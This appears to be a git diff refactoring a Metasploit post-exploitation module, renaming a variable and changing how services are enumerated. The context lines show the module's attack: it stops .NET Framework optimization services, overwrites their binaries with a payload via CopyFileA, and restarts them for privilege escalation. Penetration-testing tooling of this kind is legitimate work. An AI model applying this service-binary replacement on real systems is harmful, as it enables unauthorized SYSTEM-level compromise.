@@ -43,7 +43,7 @@ class Metasploit3 < Msf::Post
 
   def run
     paths = []
-    services = []
+    candidate_services = []
     vuln = ""
     @temp = session.fs.file.expand_path("%TEMP%")
 
@@ -54,11 +54,11 @@ class Metasploit3 < Msf::Post
     print_status("Checking for vulnerable .NET Framework Optimization service")
     print_status("This may take a few minutes.")
     # enumerate the installed .NET versions
-    service_list.each do |service|
+    each_service do |service|
       if service[:name] =~ /clr_optimization_.*/
         info = service_info(service[:name])
         paths << info[:path]
-        services << service[:name]
+        candidate_services << service[:name]
         begin
           service_stop(service[:name]) # temporarily stop the service
           print_status("Found #{service[:name]} installed")
@@ -84,7 +84,7 @@ class Metasploit3 < Msf::Post
       payload = setup_exploit
     end
 
-    services.each do |service|
+    candidate_services.each do |service|
       session.railgun.kernel32.CopyFileA(payload, vuln, false)
 
       # restart the service
